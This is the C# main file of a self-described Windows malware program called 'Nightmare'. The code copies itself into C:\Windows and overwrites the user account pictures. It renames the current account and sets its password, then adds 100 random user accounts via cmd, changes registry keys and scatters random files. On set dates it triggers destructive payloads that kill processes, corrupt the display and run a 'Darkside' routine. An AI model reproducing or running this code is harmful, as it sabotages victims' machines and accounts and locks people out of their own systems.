using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Nightmare.Payloads;

namespace Nightmare
{
    public class Program
    {
        public static void Main()
        {
            string hklmWinNtCurrent = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            string osMajor = Registry.GetValue(hklmWinNtCurrent, "CurrentMajorVersionNumber", "").ToString();

            if (osMajor != "10")
            {
                MessageBox.Show(@"This Malware is only intended for newer versions of the Windows OS.",
                    @"Bad Compability", MessageBoxButtons.OK);
                Environment.Exit(-1);
            }

            int[] dates = { 294, 14, 68, 261 };

            Random rand;
            rand = new Random();

            string[] res =
            {
                "background.jpg", "guest.bmp", "guest.png", "kill.ico", "user-192.png", "user-32.png", "user-40.png",
                "user-48.png", "user.bmp", "user.png"
            };

            if (!File.Exists(@"C:\Windows\Nightmare.exe"))
            {
                File.Copy(Application.ExecutablePath, @"C:\Windows\Nightmare.exe");
                for (int num = 0; num < res.Length; num++)
                {
                    Extract.ExtractResource("Nightmare",
                        @"C:\ProgramData\Microsoft\User Account Pictures\",
                        "Resources",
                        res[num]);
                }

                Cmd.CmdResource("cmd.exe",
                    @"/k wmic useraccount where name = '%username%' rename " + "NIGHTMARE" + @" && net user NIGHTMARE kill && exit");
                for (int num = 0; num < 100; num++)
                {
                    Cmd.CmdResource("cmd.exe", @"/k net user " + GeneratorChar.gen(14) +
                                               " " + GeneratorChar.gen(14) + @" /add && exit");
                    Thread.Sleep(10);
                }
                Regs.ModifyRegistryKeys();
                RandFiles.rnd_files();
            }
            else if (dates[0] == DateTime.Now.DayOfYear)
            {
                var movePayload = new MoveIcons();
                movePayload.MoveIcon();
            }
            else if (dates[1] == DateTime.Now.DayOfYear)
            {
                var processPayload = new KillExe();
                processPayload.KillProcess();
            }
            else if (dates[2] == DateTime.Now.DayOfYear)
            {
                var gdiPayload = new Gdi();
                gdiPayload.GDIPayload();
            }
            else if (dates[3] == DateTime.Now.DayOfYear)
            {
                var darkSidePayload = new Darkside();
                darkSidePayload.Payload();
            }
        }
    }
}